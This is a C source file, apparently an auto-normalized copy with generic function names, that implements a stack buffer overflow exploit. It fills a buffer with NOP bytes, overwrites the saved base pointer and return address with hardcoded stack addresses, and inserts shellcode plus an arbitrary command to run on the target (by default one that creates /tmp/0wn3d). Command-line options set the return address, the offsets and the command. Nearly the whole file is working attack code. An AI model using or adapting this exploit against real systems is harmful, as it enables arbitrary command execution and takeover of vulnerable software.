#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int BUF_SIZE ; 
 char EOF ; 
 char* TALKING ; 
 int /*<<< orphan*/  FUNC0 (char*,char*,size_t) ; 
 int /*<<< orphan*/  FUNC1 (char*,int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,char*,...) ; 
 char FUNC4 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC5 (char*,int,int) ; 
 char* optarg ; 
 int /*<<< orphan*/  FUNC6 (char*,char*) ; 
 char* shellcode ; 
 int /*<<< orphan*/  stderr ; 
 size_t FUNC7 (char*) ; 
 unsigned long FUNC8 (char*,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 

int FUNC9(int argc, char **argv) {
char buf[BUF_SIZE+1];
char *foo;
char *command, c;
unsigned long retaddr,bp, offset, shelloffset;

/* defaults */
command="/bin/touch /tmp/0wn3d";
retaddr=0xbfffe598;
bp=0xbfffe678;
offset = 16;
shelloffset = 24;


while((c = FUNC4(argc, argv, "s:c:")) !=EOF) 
        switch(c) {
                case 's':
                        retaddr = FUNC8(optarg,NULL,0); 
                        break;
                case 'a':
                        shelloffset = FUNC8(optarg,NULL,0); 
                        break;
                case 'o':
                        offset = FUNC8(optarg,NULL,0); 
                        break;
                case 'c':
                        command = optarg;
                        if (FUNC7(command) > 42) 
                                FUNC3(stderr,"WARNING: your command line "
                                "might get truncated!\n");
                        break;
                default:
                        FUNC3(stderr, "usage %s [-c command] [-s retaddr]"
                        " [-o offset] [-a shelloffset]\n", argv[0]);
                        FUNC2(1);

        }


 foo=&buf[offset];
 FUNC1(buf,BUF_SIZE+1);
 FUNC5(buf,0x90,BUF_SIZE);

 *foo++ = (bp >> 0) & 0xff;
 *foo++ = (bp >> 8) & 0xff;
 *foo++ = (bp >>16) & 0xff;
 *foo++ = (bp >>24) & 0xff;

 *foo++ = (retaddr >> 0) & 0xff;
 *foo++ = (retaddr >> 8) & 0xff;
 *foo++ = (retaddr >>16) & 0xff;
 *foo++ = (retaddr >>24) & 0xff;
 /*
  * you can get outside the buffer boundaries here but I don't care. Very long
  * command lines would be damaged by shellcode or truncated anyway.. 
  */
 FUNC0(shellcode,&buf[shelloffset],FUNC7(shellcode+1));
 FUNC0(command,&buf[24+FUNC7(shellcode)],FUNC7(command)+1);
 FUNC6(TALKING, buf);

}